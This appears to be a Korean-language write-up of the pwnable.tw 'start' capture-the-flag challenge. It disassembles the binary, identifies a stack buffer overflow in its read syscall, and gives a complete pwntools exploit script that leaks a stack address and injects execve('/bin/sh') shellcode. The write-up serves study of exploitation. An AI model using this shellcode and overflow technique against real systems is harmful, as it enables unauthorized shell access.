# start

Just a start.

`nc chall.pwnable.tw 10000`

[start](https://pwnable.tw/static/chall/start)

---

```
$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

32비트 ELF 실행파일로 정적으로 링크되어 있고 디버깅 정보가 그대로 붙어있다.

```
pwndbg> checksec
[*] '/home/jhyun/Desktop/Hacking/pwnable.tw/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

메모리 보호기법은 따로 걸려있지 않다.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
0xf7ffc820  __vdso_clock_gettime
0xf7ffcd10  __vdso_gettimeofday
0xf7ffcfa0  __vdso_time
0xf7ffcfe0  __kernel_vsyscall
0xf7ffd000  __kernel_sigreturn
0xf7ffd010  __kernel_rt_sigreturn
```

`_start`와 `_exit`가 아마 작성한 코드이고 나머지는 컴파일러가 생성한 코드인것 같다.

```
pwndbg> disass _start
Dump of assembler code for function _start:
   0x08048060 <+0>:	push   esp
   0x08048061 <+1>:	push   0x804809d
   0x08048066 <+6>:	xor    eax,eax
   0x08048068 <+8>:	xor    ebx,ebx
   0x0804806a <+10>:	xor    ecx,ecx
   0x0804806c <+12>:	xor    edx,edx
   0x0804806e <+14>:	push   0x3a465443
   0x08048073 <+19>:	push   0x20656874
   0x08048078 <+24>:	push   0x20747261
   0x0804807d <+29>:	push   0x74732073
   0x08048082 <+34>:	push   0x2774654c
   0x08048087 <+39>:	mov    ecx,esp
   0x08048089 <+41>:	mov    dl,0x14
   0x0804808b <+43>:	mov    bl,0x1
   0x0804808d <+45>:	mov    al,0x4
   0x0804808f <+47>:	int    0x80
   0x08048091 <+49>:	xor    ebx,ebx
   0x08048093 <+51>:	mov    dl,0x3c
   0x08048095 <+53>:	mov    al,0x3
   0x08048097 <+55>:	int    0x80
   0x08048099 <+57>:	add    esp,0x14
   0x0804809c <+60>:	ret    
End of assembler dump.
```

C로 짜서 컴파일 한게 아니라 어셈블리로 작성한 다음 어셈블러로 실행 파일을 만든것 같다. 별다른 함수 호출이 없고 [시스템 콜](http://shell-storm.org/shellcode/files/syscalls.html)로 진행한다. 

1. $ecx = $esp ("Let's start the CTF:")
2. sys_write(STDOUT, $ecx, 0x14)
3. sys_read(STDIN, $ecx, 0x3C)

위 설명처럼 `sys_write`로 쓸말 출력하고, `sys_read`로 표준 입력에서 입력을 받는다. 이때 입력값의 크기가 `0x14`보다 크기 때문에 버퍼 오버플로우가 발생해 실행흐름을 바꿀 수 있다.

`sys_execve` 시스템 콜로 `/bin/sh`을 실행하는 쉘코드를 만들던지 주워다 쓰던지 일단 가지고 온다. 난 [여기서](http://shell-storm.org/shellcode/files/shellcode-811.php) 가져왔다.

리턴 주소를 `*_start+39`로 덮어 씌워서 스택 주소를 유출시키고, 유출시킨 스택 주소를 바탕으로 쉘코드를 다시 호출하면 된다.

```python
from pwn import *
import struct

r = remote("chall.pwnable.tw", 10000)
# r = process("/home/jhyun/Desktop/Hacking/pwnable.tw/start")
# context.log_level='debug'
# gdb.attach(r, 'b* 0x08048097')

print r.recv()

payload = 'A' * 20 + '\x87'

r.send(payload)

s = r.recv()

addr = struct.unpack('<I', s[0:4])[0]

print "OUTPUT :", repr(s), ",ADDRESS : ", hex(addr)

payload = 'A'*20
payload += p32(addr + 0x14)
payload += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

r.send(payload)

r.interactive()
```